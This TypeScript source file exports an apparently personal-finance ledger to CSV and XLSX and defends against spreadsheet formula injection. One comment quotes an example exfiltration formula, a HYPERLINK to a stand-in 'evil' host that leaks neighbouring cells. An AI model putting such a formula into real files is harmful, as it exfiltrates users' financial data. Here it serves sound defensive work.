import Papa from 'papaparse';
import ExcelJS from 'exceljs';
import { AccountRepository } from '../dexie/accountRepository';
import { CategoryRepository } from '../dexie/categoryRepository';
import { TransactionRepository } from '../dexie/transactionRepository';

export interface ExportRow {
	date: string;
	account: string;
	categories: string;
	amount: string; // rupees, "-" separated by two decimals
	notes: string;
}

/** Flattens the ledger into export-ready rows (FR-039): amounts in rupees, human-readable names. */
export async function buildExportRows(key: CryptoKey): Promise<ExportRow[]> {
	const [accounts, categories, transactions] = await Promise.all([
		AccountRepository.list(key),
		CategoryRepository.list(key),
		TransactionRepository.search(key)
	]);
	const accountNameById = new Map(accounts.map((a) => [a.id, a.name]));
	const categoryNameById = new Map(categories.map((c) => [c.id, c.name]));

	// One grouped query for every split, rather than one indexed query plus one decrypt batch
	// per transaction. At 20k transactions the old loop issued 20k round trips.
	const splitsByTx = await TransactionRepository.splitsByTransaction(key);

	const rows: ExportRow[] = [];
	for (const tx of transactions) {
		const splits = splitsByTx.get(tx.id) ?? [];
		const categoryNames = splits.map((s) => categoryNameById.get(s.categoryId) ?? 'Uncategorized');
		rows.push({
			date: tx.date,
			account: accountNameById.get(tx.accountId) ?? tx.accountId,
			categories: [...new Set(categoryNames)].join('; '),
			amount: (tx.amount / 100).toFixed(2),
			notes: tx.notes ?? ''
		});
	}
	return rows;
}

/**
 * Spreadsheet formula injection defence (CWE-1236). Notes, account names, and category names
 * are user-controlled text, and this file exists to be opened in Excel/LibreOffice/Sheets —
 * where a cell beginning `=`, `+`, `-`, `@`, or a control character is evaluated as a formula.
 * A note reading "Refund details" can be `=HYPERLINK("http://evil/?d="&A1,"Refund details")`,
 * which exfiltrates neighbouring cells when clicked.
 *
 * The realistic delivery is not self-attack: it is a hostile merchant description arriving
 * through CSV import, sitting in the ledger, and detonating when the user later exports and
 * opens the file — or forwards it to an accountant.
 *
 * A leading tab makes spreadsheets treat the cell as text; they strip it on display, so the
 * value still reads correctly.
 */
const FORMULA_TRIGGER = /^[=+\-@\t\r]/;

function neutralizeFormula(value: string): string {
	return FORMULA_TRIGGER.test(value) ? `\t${value}` : value;
}

/** `date` and `amount` are generated, not user text, and `amount` legitimately starts with
 *  `-` — prefixing it would break numeric parsing in the spreadsheet. */
function sanitizeRow(row: ExportRow): ExportRow {
	return {
		...row,
		account: neutralizeFormula(row.account),
		categories: neutralizeFormula(row.categories),
		notes: neutralizeFormula(row.notes)
	};
}

export function exportToCsvBlob(rows: ExportRow[]): Blob {
	const csv = Papa.unparse(rows.map(sanitizeRow));
	return new Blob([csv], { type: 'text/csv;charset=utf-8' });
}

export async function exportToXlsxBlob(rows: ExportRow[]): Promise<Blob> {
	const workbook = new ExcelJS.Workbook();
	const sheet = workbook.addWorksheet('Transactions');
	sheet.columns = [
		{ header: 'Date', key: 'date' },
		{ header: 'Account', key: 'account' },
		{ header: 'Categories', key: 'categories' },
		{ header: 'Amount', key: 'amount' },
		{ header: 'Notes', key: 'notes' }
	];
	sheet.addRows(rows.map(sanitizeRow));
	const buffer = await workbook.xlsx.writeBuffer();
	return new Blob([buffer], {
		type: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
	});
}
